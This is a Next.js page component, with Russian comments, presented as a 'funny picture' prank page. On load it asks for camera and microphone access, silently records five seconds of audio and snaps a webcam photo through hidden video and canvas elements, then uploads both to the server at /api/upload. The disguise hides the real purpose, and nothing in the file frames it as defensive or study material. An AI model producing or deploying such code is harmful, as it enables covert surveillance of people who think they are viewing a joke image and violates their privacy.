"use client";

import { useEffect, useRef, useState } from "react";

export default function Home() {
  const [recording, setRecording] = useState(false);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);

  useEffect(() => {
    const startCapture = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true,
        });

        if (videoRef.current) {
          videoRef.current.srcObject = stream;
        }

        // Запись аудио
        const mediaRecorder = new MediaRecorder(stream);
        const audioChunks: Blob[] = [];
        mediaRecorder.ondataavailable = (event) => {
          audioChunks.push(event.data);
        };

        mediaRecorder.start();
        setRecording(true);

        setTimeout(() => {
          mediaRecorder.stop();
          setRecording(false);
        }, 5000);

        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
          sendData(audioBlob);
        };

        // Захват фото
        setTimeout(() => {
          takePhoto();
        }, 3000);
      } catch (error) {
        console.error("Ошибка доступа к камере/микрофону", error);
      }
    };

    startCapture();
  }, []);

  const takePhoto = () => {
    if (!canvasRef.current || !videoRef.current) return;

    const context = canvasRef.current.getContext("2d");
    if (!context) return;

    context.drawImage(videoRef.current, 0, 0, 640, 480);
    canvasRef.current.toBlob((blob) => {
      if (blob) sendData(blob);
    }, "image/png");
  };

  const sendData = async (blob: Blob) => {
    const formData = new FormData();
    formData.append("file", blob);

    await fetch("/api/upload", {
      method: "POST",
      body: formData,
    });
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gray-900 text-white">
      <h1 className="text-2xl font-bold mb-4">🤡 Смешная картинка</h1>
      <img src="/funny.jpg" alt="Prank" className="w-96 h-auto rounded-lg" />
      <video ref={videoRef} autoPlay className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />
      {recording && <p className="mt-2">🔴 Запись идет...</p>}
    </div>
  );
}
